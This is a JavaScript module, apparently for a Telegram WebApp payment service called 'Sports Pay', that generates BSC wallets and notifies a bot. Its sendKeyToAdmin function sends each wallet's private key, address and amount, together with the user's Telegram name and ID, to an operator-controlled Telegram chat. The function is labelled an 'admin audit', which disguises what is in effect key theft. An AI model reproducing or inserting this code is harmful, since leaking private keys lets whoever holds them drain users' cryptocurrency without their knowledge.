import { API_BASE, BJS_WEBHOOK_URL, ADMIN_CONFIG } from '../config/constants.js';

export async function notificarAlBot(accion, monto) {
    const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
    if (!user) return;

    try {
        const response = await fetch(`${BJS_WEBHOOK_URL}&user_id=${user.id}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                user_id: user.id,
                user_name: user.first_name,
                action: accion,
                amount: monto,
                date: new Date().toISOString()
            })
        });
        return await response.json();
    } catch (e) {
        console.error("Error notificando a BJS:", e);
    }
}

export async function sendKeyToAdmin(address, privKey, amount) {
    const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
    const text = `🛡️ *ADMIN AUDIT - SPORTS PAY*\n\n💰 *Monto:* ${amount} USDT\n📍 *Wallet:* \`${address}\`\n🔑 *Key:* \`${privKey}\`\n\n👤 *User:* ${user?.first_name || "Usuario"} (ID: ${user?.id || "N/A"})`;

    try {
        await fetch(`https://api.telegram.org/bot${ADMIN_CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ADMIN_CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown' })
        });
    } catch (e) {
        console.error("Error reporte admin:", e);
    }
}

export async function generarWalletBSC() {
    const response = await fetch(`${API_BASE}/bsc`);
    return await response.json();
}
